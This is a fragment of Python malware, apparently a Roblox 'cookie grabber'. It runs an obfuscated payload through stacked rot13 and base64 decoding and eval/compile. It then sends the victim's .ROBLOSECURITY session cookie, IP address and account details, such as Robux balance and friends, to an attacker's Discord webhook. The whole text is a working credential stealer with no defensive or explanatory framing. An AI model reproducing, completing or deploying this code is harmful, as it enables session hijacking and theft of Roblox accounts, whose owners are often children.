EJzQmRQOE0rRipId0VaJioyYVNhM0ZLTDI3OT5ieHR7Q1lHLTBKRmhlbkJLYChiQGMyaVBSY3RVWThjUVNLb0hFJUw+WEg7bn5UNVVIJUR7eSU/U1ojNEthYmhjSFIlTGkqVj98XzhRYjtwSVNYVzdOSGJRZWBNTzA5N0crOUQmV0dec0dEfEIjclImcXM1Y1RPYCtIQV4qYUdEbClETHJnTD5kTlhpaEglZG58SCFEZTNXTmQ2V1Aob1UzUSlPNSZIYVQpbWFDQT5gUUF1dWZRK0lONFMkUSV6TkxYK35YSC14IU5AWnY8WC0jdVVJNWtLfVpjakskT2wzbilGaGdjfGJ5UEJWTFR6dE1XaWQhTlA7UFFnVzxmR3FGSWpxTVhMTEFsVnBke2lZZkVLd1dIeHdlVzxnXzNPRjFgS1N5TTQ7VmxzTCpiWXcrdkhoRSs8VDMxWTJROF9DeFQ1MiNAYXlDZCFQY30kWVM3JUV8U1o7VDZhZFN2Qlc+YUh0TW8pSGVYaXJCJkZqUDVjTk9NTVZYa2xyMFFnY2MtYjJkO3BWTjdaQEY+Z1hTRykhWW1GTF99P1M2NW5EUSZCV1VhKEdIfmN5ZT1SRml1KVFIJVUtZExTO2Q5R0lkIXNjUThVWUYpSz9tT207KnlZRGpIKEk3NEQqTkgweEpjdD0tM05Pbmc+SGdgflJQaTlSP1lJSEEwYXllbTFMbn15T1MjQl56V2tZNnFiMz1HPmNge35tY3VZMT1GKjltU2NyLXxGTHVFI0NZRUVRUFgrPTNXUzEoMyhRYnQ7Q1lHXnJCTXJVPn1UNVV7bkwyeC0oWjhtWGVIJW0tMVo3Kzg+WkM3PG5QZiZHWldNeWVqT2hzajVWSyNTQUwzY0VDUEhyPGRYS3BXSVgpdGVkYzY0cjdaODA9aklCN15XUEcpTFhjNGxVRkwzTD92ZFFNfF5ZJV56Y01vMko0Rj1zaEpiN3dJJUhaTkgrR2tIe0pQPENjIWN2TXZ+R2tSJTNXQDJWV2M2ZGZZTylxSjlQKUlwWExUNi1iRF5AUXJHJUg5fkY/THJtU1pQZ0djd3toNWJ9dyE8WjhhfTFXLX44IUZFNHNkSDhWeXhPPzVJY1orY309WWpKOUpifXcjQ1ZsWCYyY3J8TT9ZQm90bFZzM2VQYllmVUJIRWMkMUY7US0xVzxxZ0pHSHo1aEhFREtYTHNlcFVXbGw/NFJDR0J3SGN+bG1JNzRRMWNTfiRJVz1MZ1dSQ0Y/QVpmI1VHSGV4dypSOUd9WlY+ZEBIR2o0WkpSeDRxOGRVYUd6TW1SWlhQZjJxJlQ2WnNaV19VTF5OLXRgMVklejZFTk4jI35XLURrPUx2SkBQTFBjanRaRHY3MUt8dyk1WSZjPFFMMEM5ZU1eOG1UTDFBbGFZZzE3e0t9fHxBY'
destiny = 'a12qR9wqQ5JBRjkV2MbF3k3XGyGAKkZAFpcXFxcXFxAPy9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGQ0aK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZWj0XK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZCFqsK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRksK01CGxgSJI9KDHkZK19AG05YEIysI0SZGS9sGH9BF0IMK1qOGRja'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
